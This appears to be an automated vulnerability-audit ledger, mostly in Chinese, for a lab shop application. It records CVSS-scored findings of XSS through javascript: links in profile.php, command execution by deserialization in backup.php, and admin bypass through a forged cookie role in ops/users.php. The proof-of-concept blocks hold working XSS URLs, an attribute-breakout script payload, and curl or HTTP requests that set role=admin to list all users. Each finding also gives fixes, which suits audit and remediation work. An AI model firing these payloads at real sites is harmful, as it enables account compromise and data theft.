- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:18:58.501805+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| AC | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| PR | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| UI | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| S | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| C | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| I | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| A | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |

评分、引用校验、自动验证和结论处置分别记录。

- account/profile.php url 参数未校验协议直接进入 href 导致 javascript: 伪协议 XSS（CVSS 3.1 Base 4.6 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `52b06565d62a4ff98fd690cb05f36c44` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：profile.php 第2行从 $_GET['url']（缺省取用户 homepage）读取链接，第3行直接拼接进 <a id="profile-link" href="'.$url.'">。h() 仅做 htmlspecialchars 实体编码，不会剥离 javascript: 等伪协议，攻击者构造 url=javascript:alert(document.cookie) 即可在受害者浏览器同源执行脚本。
  输入：$_GET['url']，或用户可控的 users.homepage（update.php:4-6 可设置）
  传播：profile.php:2 读取 url -> profile.php:3 拼接进 href 输出
  危险操作：echo 未净化 URL 到 href 属性
  保护：h() 仅 HTML 转义（bootstrap.php:10），无协议白名单/URL scheme 校验
  修复建议：对 url 使用 filter_var($url, FILTER_VALIDATE_URL) 或仅允许 http/https 白名单后再输出。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:21:37.254390+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 参数远程触发 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造 url=javascript:... 即可 | lab30-shop/app/public/account/profile.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | profile.php 调用 require_user 需登录账户 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 受害者需点击/生成的主页链接 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 脚本在商城源执行，未跨安全边界 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可在同源执行脚本读取/操作页面 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 脚本可篡改页面内容 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接可用性破坏证据 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。

- account/profile.php 的 url 参数未经协议校验直接写入 href，导致 javascript: 伪协议 XSS（CVSS 3.1 Base 4.6 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `4412bad3604e47a8ae86a4d7b22074c7` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：profile.php 第2行将 $_GET['url'] 强制转为 string 后存入 $url，第3行闭包中直接 echo '<a ... href="'.$url.'">' 输出到 HTML 属性，全程未调用 h() 也未做协议白名单。form_input 对输入框 value 有 h() 转义，但反射到 href 的部分没有转义，攻击者可构造 url=javascript:alert(document.domain) 使受害者点击链接时执行脚本；也可用 " 闭合属性注入任意标签。
  输入：GET 参数 url（第2行 $_GET['url']）
  传播：第2行 $url=(string)$_GET['url'] → 第3行闭包 use($url) → echo '<a href="'.$url.'">' 直接拼入 HTML 属性
  危险操作：未转义/未校验协议将用户输入反射到 href 属性（HTML sink）
  保护：同文件 display_name 用 h() 转义；bootstrap.php:10 h() 定义为 htmlspecialchars ENT_QUOTES，但 href 输出处未调用；无 javascript:/data: 协议白名单
  前提：['受害者需登录（require_user）并访问带恶意 url 参数的预览页后点击渲染出的链接或触发自动加载路径']
  修复建议：输出 href 前对 $url 使用 h() 转义，并仅允许 http/https 协议（如 filter_var FILTER_VALIDATE_URL + scheme 白名单），否则回退默认主页。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:22:54.051569+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 经 HTTP 参数远程注入 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 url 参数即可，无需特殊条件 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录用户会话（require_user） | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击反射出的链接 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在浏览器同源内执行脚本 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取同源页面数据 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可在受害浏览器上下文发起同源请求 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接持久性破坏证据 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'profile_xss_poc.txt', 'language': 'text', 'script': '登录后访问：/account/profile.php?url=javascript:alert(document.domain)\n渲染为 <a href="javascript:alert(document.domain)">；点击即执行。\n属性闭合注入：/account/profile.php?url="><script>alert(1)</script>', 'instructions': '以已登录会话访问目标 /account/profile.php 并带恶意 url 参数，观察返回 HTML 中 href 原样反射。', 'normal_input': 'url=https://example.com', 'attack_input': 'url=javascript:alert(document.domain)', 'expected_result': '正常输入渲染为合法 https 链接；攻击输入渲染为 href="javascript:..."，点击执行脚本'}
````

- account/profile.php url 参数未编码直接进入 href 导致 javascript: 伪协议 XSS（CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `a66a36797db6475d8c589dd07e6f2d8c` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：profile.php:2 使用 $_GET['url'] 覆盖用户 homepage 字段；profile.php:3 将该值直接拼入 <a id="profile-link" href="$url">，未调用 h() 也未校验协议白名单，攻击者可注入 javascript:alert(document.cookie) 等伪协议触发脚本执行。
  输入：HTTP GET 参数 url
  传播：profile.php:2 $_GET['url'] -> (string) $url -> profile.php:3 字符串拼接进 href
  危险操作：未转义输出到 HTML 属性上下文
  保护：无：未调用 h()，无协议白名单；h()/form_input 仅用于 display_name 与输入框，href 直接裸拼
  前提：['受害者点击形如 /account/profile.php?url=javascript:alert(1) 的链接']
  修复建议：仅接受 http/https 绝对或相对路径并用 h() 转义：校验 parse_url scheme，拒绝 javascript:/data: 等。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:23:55.345646+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 远程访问 | lab30-shop/app/public/account/profile.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | payload 直接作为 url 参数即可 | lab30-shop/app/public/account/profile.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | GET 参数无需额外权限；未登录会先被 require_user 拦截，但参数读取不依赖权限，受害者点击链接即可触发 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-37 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者访问构造的链接并在页面中点击/触发该 href | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一页面上下文执行脚本 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取页面上下文与 cookie 之外的会话内数据，伪造交互 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可代表受害者在同源页面发起请求（cookie httponly 但可用 CSRF token 读取后伪造） | lab30-shop/app/src/bootstrap.php:38-40 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏可用性证据 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'profile_xss_poc.txt', 'language': 'http', 'script': 'GET /account/profile.php?url=javascript:alert(document.domain) HTTP/1.1\nHost: target\n', 'instructions': '登录后访问构造的 URL 并点击“访问个人主页”链接。', 'normal_input': '/account/profile.php?url=https://example.com', 'attack_input': '/account/profile.php?url=javascript:alert(document.domain)', 'expected_result': '正常输入为普通外链；攻击输入在点击后执行 javascript:alert'}
````

- account/profile.php url 参数未编码进入 href 导致 javascript: 伪协议 XSS（CVSS 3.1 Base 4.6 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `3ecc910a69bc472ca8b5b8276ec6a1d4` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 46, 'end_line': 46}]
  结论：profile.php 第 2 行从 $_GET['url'] 读取用户输入（缺省用 u['homepage']），第 3 行直接 echo '<a id="profile-link" href="'.$url.'">'，既未调用 h() 编码也不做协议白名单，攻击者可构造 url=javascript:alert(document.cookie) 使受害者点击后执行脚本。form_input 对回显做了 h()，但 href sink 未编码。
  输入：HTTP GET 参数 url
  传播：$_GET['url'] -> $url -> echo '<a ... href="'.$url.'">'，无 h() 调用、无 scheme 校验
  危险操作：echo 到 HTML href 属性造成 HTML/JS 注入
  保护：同页面 form_input 用 h() 编码，但 href 输出点未编码亦无 http/https 白名单
  前提：['攻击者登录并诱使受害者访问构造的 profile.php?url=javascript:... 链接']
  修复建议：输出前对 $url 调用 h()，并在渲染前校验 scheme 仅允许 http/https

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:26:08.425256+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 链接远程触发 | lab30-shop/app/public/account/profile.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造 URL 参数 | lab30-shop/app/public/account/profile.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求已登录账户 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击 href | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 脚本在页面源内执行 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取同源 cookie/DOM | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可在页面上下文篡改表单 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接可用性影响 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'profile_xss_poc.txt', 'language': 'text', 'script': '登录后访问： /account/profile.php?url=javascript:alert(document.cookie)', 'instructions': '以任一登录用户身份访问目标站点 /account/profile.php 并附加攻击参数 url', 'normal_input': 'url=https://example.com', 'attack_input': 'url=javascript:alert(document.cookie)', 'expected_result': '正常输入生成 https 链接；攻击输入生成 href="javascript:alert(document.cookie)"，点击后执行脚本'}
````


### 台账 `1f681b33dafa4a5384aab6752e55d41e`

- backup.php 恢复功能反序列化用户输入，可用 DispatchJob gadget 触发命令执行（CVSS 3.1 待评分，验证：unverified）
  来源 `74eb930a9f274997bce933add5e696e9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 3, 'end_line': 6}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 2, 'end_line': 5}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 1, 'end_line': 5}]
  结论：backup.php 第4-5行对 POST 的 base64 数据解码后直接 unserialize，仅以 instanceof MemberBackup 放行；ispatch_job.php 第4行 __wakeup 调用 shell_exec($this->command)，无属性白名单，攻击者可构造含 DispatchJob 对象的序列化串实现任意命令执行。
  输入：POST 参数 backup（base64 编码的序列化对象）
  传播：base64_decode -> unserialize($raw) -> 触发对象 __wakeup -> shell_exec
  危险操作：shell_exec($this->command) 以攻击者可控 command 执行系统命令
  保护：仅有 instanceof MemberBackup 校验，未使用 allowed_classes 白名单或签名
  前提：['require_user、check_csrf 通过（CSRF token 由 csrf_field 下发），攻击者已登录且知道自身 token']
  修复建议：unserialize 使用 ['allowed_classes'=>['MemberBackup']]，并对反序列化内容做 HMAC 签名校验；移除或限制 DispatchJob 的 __wakeup 命令执行。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:18:58.503269+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| AC | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| PR | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| UI | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| S | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| C | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| I | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |
| A | 待补充 | 暂无依据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设；指标待补充；缺少判断依据 |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `9a66a667a5f046388568cfa10ff63cfe`

- ops/users.php 信任客户端 Cookie role 覆盖数据库角色，可伪造管理员读取全部用户数据（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `f3a2895a285e494290ce71aa3a037cb9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 36}]
  结论：ops/users.php:2 从 $_COOKIE['role'] 读取角色并覆盖从会话数据库用户取得的 $u['role']，随后仅以该值是否等于 'admin' 决定放行。意图中的管理员校验应由 bootstrap.php:33-36 require_user(['admin']) 基于数据库角色完成，但本文件未调用 require_user 角色参数，使客户端 Cookie 成为唯一授权判据。第 3 行随即查询并返回全部用户的 id、username、email、role，并通过 HTML 与 JSON（第 4 行）两种形式输出。攻击者以普通账号登录后设置 Cookie role=admin 即可访问。
  输入：HTTP Cookie 'role'
  传播：ops/users.php:2 $_COOKIE['role'] → $role → if($role!=='admin') 放行 → 第 3 行 SELECT users → 第 4/5 行输出
  危险操作：以客户端声明的角色读取全部用户账户与角色清单
  保护：无；未调用 require_user(['admin']) 校验数据库角色，Cookie 值未被忽略或与数据库角色比对
  前提：['存在至少一个可登录的普通账户以通过 user() 会话读取；发送 Cookie role=admin']
  修复建议：删除 Cookie 角色覆盖逻辑，改用 $u=require_user(['admin']) 基于数据库角色授权。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:21:10.303286+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 请求远程利用 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需在请求中设置 Cookie role=admin | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需先以任意低权限账号登录通过 require_user() | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户参与 | lab30-shop/app/public/ops/users.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅在同一应用授权范围内提升权限 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 第 3 行返回全部用户 id/username/email/role | lab30-shop/app/public/ops/users.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 本入口仅读取，不含写入 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未观察到该入口破坏可用性 | lab30-shop/app/public/ops/users.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'cookie_role_bypass.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<logged-in-sid>; role=admin' -H 'Accept: application/json' 'http://target/ops/users.php'", 'instructions': '用普通用户登录取得有效 SHOPSESSID，随后请求 /ops/users.php 并附 role=admin Cookie，观察返回 JSON 中 access=admin 与 users 列表。', 'normal_input': 'Cookie: SHOPSESSID=<customer-sid>（无 role）', 'attack_input': 'Cookie: SHOPSESSID=<customer-sid>; role=admin', 'expected_result': '普通请求返回 403；攻击请求返回 200 JSON，含全部用户的邮箱与角色。'}
````

- ops/users.php trusts client Cookie role to authorize admin user listing（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `171fcc3e63f14e5da0d3840b6e48faf0` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 2, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 25}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：ops/users.php:2 sets $role from $_COOKIE['role'] (attacker-controllable) falling back to $u['role'], then checks $role!=='admin'. Since cookies are fully client-controlled and no signature/binding exists, any logged-in user can send Cookie: role=admin to pass the check and read the full SELECT of users (id,username,email,role) at line 3, rendered or returned as JSON at line 4. The legitimate require_user gate in bootstrap.php:33-37 is simply not applied here.
  输入：Cookie header role parameter
  传播：ops/users.php:2 $_COOKIE['role'] -> $role -> comparison bypass -> SELECT users line 3 -> output line 4/5
  危险操作：Returning all users' emails and roles without server-verified role
  保护：None effective; require_user uses DB role but this file overrides with cookie
  前提：['Authenticated session with any role']
  修复建议：Ignore client cookie for authorization; use $u['role'] from the DB and apply require_user(['admin']).

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:22:22.214350+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Remotely reachable HTTP endpoint | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | Just set cookie role=admin | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | Any authenticated account can set cookie | lab30-shop/app/src/bootstrap.php:20-25 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | No other user involvement | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | Same app authorization boundary | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | All users' username/email/role exposed | lab30-shop/app/public/ops/users.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | Read-only listing, no write | lab30-shop/app/public/ops/users.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | No availability impact | lab30-shop/app/public/ops/users.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'authbypass_users.php', 'language': 'http', 'script': 'GET /ops/users.php HTTP/1.1\nHost: target\nCookie: SHOPSESSID=<valid>; role=admin\nAccept: application/json', 'instructions': 'Log in as a normal member, then replay the request adding Cookie role=admin.', 'normal_input': 'Cookie: SHOPSESSID=<valid>', 'attack_input': 'Cookie: SHOPSESSID=<valid>; role=admin', 'expected_result': 'Control returns 403; attack returns JSON with all users.'}
````

- Cookie role 可伪造导致管理员用户清单越权访问（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `4b696413552b40f58ecd8ac0eeeca00b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：ops/users.php 未调用 require_user 校验会话角色，而是用 $_COOKIE['role'] 覆盖真实角色（第2行）；Cookie 由客户端完全可控，设为 admin 即通过检查。随后第3行查询全部用户并第4行在 Accept: application/json 时直接 json_response 输出，任意已登录用户可越权读取所有账户用户名、邮箱与角色。
  输入：Cookie role
  传播：第2行 $role=(string)($_COOKIE['role']??$u['role'])；if($role!=='admin')fail... 通过后进入第3-4行
  危险操作：第3行 SELECT id,username,email,role FROM users；第4行 json_response 返回全部行
  保护：仅比较客户端 Cookie 字符串，无签名/无服务端角色核对；require_user 未被调用
  前提：['攻击者需持有任一已登录会话并设置 Cookie role=admin，请求带 Accept: application/json']
  修复建议：删除对 $_COOKIE['role'] 的信任，改用 require_user(['admin']) 基于会话中从数据库读取的角色判定。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:23:33.023034+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP Cookie 可通过远程请求设置 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需设置一个 Cookie 值 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需已登录任意普通用户以取得会话 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行发起请求 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在同一应用授权边界内 | lab30-shop/app/public/ops/users.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回全部用户 id、用户名、邮箱、角色 | lab30-shop/app/public/ops/users.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取查询 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏性操作 | lab30-shop/app/public/ops/users.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'cookie_role_bypass.sh', 'language': 'bash', 'script': "curl -s -H 'Cookie: SHOPSESSID=<valid-session>; role=admin' -H 'Accept: application/json' 'http://target/ops/users.php'", 'instructions': '以普通用户登录取得 SHOPSESSID，替换后请求 /ops/users.php，观察返回含 access:admin 与全部 users 的 JSON。', 'normal_input': 'Cookie: SHOPSESSID=<普通用户会话>', 'attack_input': 'Cookie: SHOPSESSID=<普通用户会话>; role=admin', 'expected_result': '正常请求返回 403；攻击请求返回 200 且 JSON 含全部用户邮箱与角色。'}
````

- ops/users.php 信任客户端 Cookie role 导致管理员用户清单越权访问（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `512697ac0c2449d1885ee479e8dadb02` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}, {'path': 'lab30-shop/app/public/ops/users.php', 'start_line': 2, 'end_line': 5}]
  结论：users.php 仅用 require_user() 确认已登录，随后以 (string)($_COOKIE['role']??$u['role']) 取角色再与 admin 比较，客户端 Cookie 优先于数据库真实角色。任意已登录普通会员附加 Cookie role=admin 即通过校验，读取全部用户 id/username/email/role 清单。
  输入：HTTP Cookie: role
  传播：Cookie role=admin -> $role -> if($role!=='admin') 被绕过 -> users.php:3 查询 -> users.php:4/5 输出
  危险操作：db()->query('SELECT id,username,email,role FROM users') 结果经 json_response/page 输出
  保护：require_user() 未传 roles，未比对 $u['role']；Cookie 无签名校验
  前提：['持有任意有效登录会话']
  修复建议：移除 Cookie 角色来源，改用 require_user(['admin']) 并只信 $u['role']。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:24:53.418079+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
